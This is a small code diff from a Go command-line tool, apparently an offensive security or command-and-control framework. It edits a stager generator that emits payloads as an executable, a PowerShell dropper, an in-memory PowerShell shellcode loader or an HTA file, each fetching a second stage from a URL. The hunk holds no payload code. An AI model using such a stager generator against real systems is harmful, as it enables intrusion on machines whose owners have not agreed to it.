@@ -98,7 +98,7 @@ func runStager(cmd *cobra.Command, _ []string) error {
 	case "exe":
 		data, ext = exeBytes, ".exe"
 	case "ps1":
-		data, ext = []byte(templatePS1Drop(stageURL, exeBytes)), ".ps1"
+		data, ext = []byte(templatePS1Drop(stageURL)), ".ps1"
 	case "ps1-mem":
 		data, ext = []byte(templatePS1Shellcode(stageURL)), ".ps1"
 	case "hta":
